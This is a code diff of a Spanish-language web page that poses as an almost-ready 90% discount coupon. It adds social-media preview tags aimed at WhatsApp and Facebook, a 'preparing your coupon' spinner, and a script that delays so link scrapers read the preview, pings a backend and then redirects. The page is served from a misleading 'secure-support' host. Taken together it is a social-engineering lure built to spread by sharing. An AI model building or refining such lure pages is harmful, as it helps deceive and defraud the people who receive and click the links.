@@ -2,21 +2,23 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Oferta exclusiva - 90% OFF</title>
+  <title>🎁 Cupón del 90% casi listo</title>
 
+  <!-- Open Graph (WhatsApp / Facebook) -->
   <meta property="og:title" content="🎁 Cupón del 90% casi listo">
   <meta property="og:description" content="Ayúdame a desbloquearlo ahora mismo.">
-  <meta property="og:image" content="https://secure-support-n222.onrender.com/assets/offer.jpg">
-  <meta property="og:image:secure_url" content="https://secure-support-n222.onrender.com/assets/offer.jpg">
+  <meta property="og:image" content="https://secure-support-n222.onrender.com/og/offer.jpg">
+  <meta property="og:image:secure_url" content="https://secure-support-n222.onrender.com/og/offer.jpg">
   <meta property="og:image:type" content="image/jpeg">
   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
   <meta property="og:url" content="https://secure-support-n222.onrender.com/offers">
   <meta property="og:type" content="website">
 
-
+  <!-- Twitter (también lo usan WhatsApp/FB como fallback) -->
   <meta name="twitter:card" content="summary_large_image">
 
+  <!-- Estilos -->
   <style>
     #loading-spinner {
       position: fixed;
@@ -60,20 +62,23 @@
   <div id="loading-spinner">
     <div class="spinner-wrapper">
       <div class="spinner"></div>
-      <div class="spinner-text"></div>
+      <div class="spinner-text">Preparando tu cupón…</div>
     </div>
   </div>
 
   <script>
     async function redirectAfterPing() {
       try {
-        await new Promise(r => setTimeout(r, 600));
+        // Pequeña pausa para que los scrapers lean los OG tags
+        await new Promise(r => setTimeout(r, 700));
 
+        // Ping al backend (spinner)
         await fetch("/ping", { cache: "no-store" });
 
       } catch (e) {
-
+        // silencioso
       } finally {
+        // Redirección final
         window.location.replace("/");
       }
     }
